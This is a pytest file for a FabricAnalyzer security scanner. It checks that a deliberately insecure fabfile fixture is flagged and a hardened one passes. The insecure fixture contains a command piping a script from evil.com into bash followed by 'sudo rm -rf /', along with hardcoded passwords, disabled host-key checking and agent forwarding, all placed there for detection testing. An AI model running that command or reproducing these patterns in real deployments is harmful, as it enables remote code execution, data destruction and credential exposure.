"""Tests for FabricAnalyzer."""

from pathlib import Path

from devai.fabric_analyzer import FabricAnalyzer, FabricFinding


INSECURE_FABFILE = """\
from fabric import Connection, task
import os

API_KEY = "hardcoded-secret-token-12345"

@task
def deploy(c):
    conn = Connection(
        "admin:supersecret@prod.example.com",
        connect_kwargs={"password": "rootpass"},
        gateway="jump:jumppass@bastion.example.com",
    )
    conn.run("curl http://evil.com/install.sh | bash && sudo rm -rf /")
    conn.run("pip install --index-url http://insecure.pypi.org/simple pkg")
    conn.run("git clone http://user:pass@github.com/org/repo.git")
    conn.config.disable_known_hosts = True
    conn.ssh_config = {"StrictHostKeyChecking": "no"}
    conn.forward_agent = True
    conn.run("sudo systemctl restart app", warn_only=True, prompt=False, pty=True)
    conn.cd("../../etc")

config.run.env = os.environ
"""

HARDENED_FABFILE = """\
from __future__ import annotations

import os

from fabric import Connection, task


@task
def deploy(c):
    host = os.environ.get("DEPLOY_HOST")
    user = os.environ.get("DEPLOY_USER", "deploy")
    if not host:
        raise RuntimeError("DEPLOY_HOST is required")

    conn = Connection(
        host=f"{user}@{host}",
        connect_kwargs={"key_filename": os.path.expanduser("~/.ssh/id_ed25519")},
    )
    conn.run("git pull && systemctl restart app", pty=False, warn_only=False)


@task
def status(c):
    host = os.environ.get("DEPLOY_HOST")
    user = os.environ.get("DEPLOY_USER", "deploy")
    if not host:
        raise RuntimeError("DEPLOY_HOST is required")

    conn = Connection(
        host=f"{user}@{host}",
        connect_kwargs={"key_filename": os.path.expanduser("~/.ssh/id_ed25519")},
    )
    conn.run("systemctl status app", pty=False, warn_only=False)
"""


class TestFabricAnalyzer:
    def test_detects_insecure_fabfile(self, tmp_path: Path):
        (tmp_path / "fabfile.py").write_text(INSECURE_FABFILE, encoding="utf-8")
        analyzer = FabricAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "dangerous_command" in kinds
        assert "ssh_password_auth" in kinds
        assert "connect_kwargs_password" in kinds
        assert "host_key_checking_disabled" in kinds
        assert "warn_only" in kinds
        assert "prompt_disabled" in kinds
        assert "env_forward_all" in kinds
        assert "insecure_pip_index" in kinds
        assert "agent_forward" in kinds
        assert "remote_sudo" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_fabfile_clean(self, tmp_path: Path):
        (tmp_path / "fabfile.py").write_text(HARDENED_FABFILE, encoding="utf-8")
        analyzer = FabricAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_detects_fabfile_package(self, tmp_path: Path):
        fab_dir = tmp_path / "fabfile"
        fab_dir.mkdir()
        (fab_dir / "__init__.py").write_text(INSECURE_FABFILE, encoding="utf-8")
        analyzer = FabricAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "fabfile/__init__.py" for f in findings)

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "fabfile.py").write_text(INSECURE_FABFILE, encoding="utf-8")
        analyzer = FabricAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == "fabfile.py"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "fabfile.py").write_text(INSECURE_FABFILE, encoding="utf-8")
        analyzer = FabricAnalyzer(str(tmp_path))
        assert "Fabric configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Fabric analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_template(self):
        snippet = FabricAnalyzer(".").generate_hardened_template()
        assert "fabfile" in snippet or "fabric" in snippet
        assert "warn_only=False" in snippet

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = FabricAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.config_files == 0

    def test_finding_dataclass(self):
        finding = FabricFinding(
            kind="test",
            severity="low",
            message="test message",
            path="fabfile.py",
            lineno=1,
        )
        assert "test message" in finding.format()
